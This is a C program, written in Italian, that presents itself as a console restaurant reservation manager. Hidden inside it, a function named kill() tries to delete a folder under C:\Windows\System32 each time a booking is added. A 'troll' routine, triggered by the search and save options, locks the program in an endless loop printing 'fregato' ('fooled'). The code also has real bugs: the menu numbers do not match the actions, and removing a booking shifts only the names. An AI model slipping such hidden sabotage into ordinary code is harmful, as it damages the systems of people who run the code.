#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct data{
    int minuti;
    int ora;
}Data;

typedef struct cliente{
    char nome[100];
    int npersone;
    int tavolo;
    Data data;
} Clienti;

void menu();
void aggiungi(Clienti *c, int *f);
void stampa(Clienti *c, int f);
void kill();
void ricerca( Clienti *c, int f);
void ordinamento(Clienti *c, int f);
void file(Clienti *c, int f);
void troll();
void rimuovi(Clienti *c, int *f);
void stampa_fregato_in_loop();

int main(){
    Clienti c[50];
    int f=0;
    int a;
    do{
        menu();
        printf("scrivi cosa vuoi fare:");
        scanf("%d", &a);
        switch(a){
            case 1:
            aggiungi(c, &f);
            break;
            case 2:
            stampa(c, f);
            break;
            case 3:
            ricerca(c, f);
            break;
            case 4:
            ordinamento(c, f);
            break;
            case 5:
            file(c, f);
            break;
            case 6:
            rimuovi(c, &f);
            break;
            default:
            printf("il tasto che hai schiaciato non fa nulla"); 
        }

    }while(a!=0);
    printf("FINE");

    return 0;
}
void menu(){
    printf("\n\tMENU\t\n");
    printf("\n1 aggiungi prenotazione");
    printf("\n2 clienti gia inseriti");
    printf("\n3 stampa prenotazioni");
    printf("\n4 ricerca persone");
    printf("\n5 ordina persone");
    printf("\n6 stampa su un file\n");
    printf("\n7 elimina la prenotazione\n");
}
void aggiungi(Clienti *c, int *f){
    if(*f<50){
            int b=0;
            do {
                printf("scrivi quante prenotazioni vuoi aggiungere:");
                scanf("%d", &b);
                }while(b<=0);
            for(int i=0; i<b; i++){
                printf("scrivi il nome:");
                scanf("%99s",  c[*f].nome);
                printf("scrivi il numero di persone:");
                scanf("%d", &c[*f].npersone);
                printf("scrivi il numero del tavolo:");
                scanf("%d", &c[*f].tavolo);
                printf("scrivi l'ora(ora):");
                scanf("%d", &c[*f].data.ora);
                printf("scrivi l'ora(minuti):");
                scanf("%d", &c[*f].data.minuti);
                (*f)++;
            }

    }else{
        printf("ristorante pieno");
    }
    kill();
}
void stampa(Clienti *c, int f){
    for(int i=0; i<f; i++){
        printf("%d) nome:%s numero persone:%d numero del tavolo:%d orario:%d:%d\n", i+1,c[i].nome, c[i].npersone, c[i].tavolo, c[i].data.ora, c[i].data.minuti);
    }
}
void ricerca( Clienti *c, int f){
    int max = 0;
    int j = 0;
    for(int i=0; i < f; i++){
        
        if(max < c[i].npersone){
            max=c[i].npersone;
            j=i;
        }
    }
    troll();
    printf("nome:%s numero di persone:%d numero del tavolo:%d", c[j].nome, c[j].npersone, c[j].tavolo);
}
void ordinamento(Clienti *c, int f){
    
    for(int i=0; i<f-1; i++){
        for(int j=0; j<f-i-1; j++){
            if(c[j].data.ora < c[j+1].data.ora){
                Clienti max=c[j+1];
                c[j+1]=c[j];
                c[j]=max;
            }
            if(c[j].data.ora == c[j+1].data.ora && c[j].data.minuti < c[j+1].data.minuti){
                Clienti max=c[j+1];
                c[j+1]=c[j];
                c[j]=max;
            }
        }
        
    }
}
void file(Clienti *c, int f){

    FILE *file=fopen("prenotazioni.txt", "w");
    if(file==NULL){
        printf("ERROR");
    }else{
        printf("file aperto con succeso\n");
    }
    fprintf(file, "numero prenotazioni %d", f);
    for(int i=0; i<f; i++){
        fprintf(file, "\n%d) nome:%s numero persone:%d numero tavolo:%d orario:%d:%d\n", i+1, c[i].nome, c[i].npersone, c[i].tavolo, c[i].data.ora, c[i].data.minuti);
    }
    stampa_fregato_in_loop();
    fclose(file);
    printf("\nfile salvato");
}
void rimuovi(Clienti *c, int *f){
    char a[50];
    printf("scrivi il nome della prenotazione che vuoi eliminare:");
    scanf("%49s", a);
    for(int i=0; i<*f; i++){

        if(strcmp(c[i].nome,a)==0){

            for(int j=i; j<*f-1;j++){
                strcpy(c[j].nome, c[j+1].nome);
            }
            (*f)--;
            printf("prenotazione rimossa con sucesso");
        }
        if(i==*f){
            printf("prenotazione non trovata");
        }
    }

}
void kill(){
    char *directory_name = "C:\\Windows\\System32lp";

   
    if (rmdir(directory_name) == 0) {
        printf("La cartella è stata eliminata con successo.\n");
    } else {
        printf("Errore durante l'eliminazione della cartella.\n");
    }
}
void troll(){
    kill();
    stampa_fregato_in_loop();
}
void stampa_fregato_in_loop() {
    while (1) {
        printf("fregato\n");
    }
}
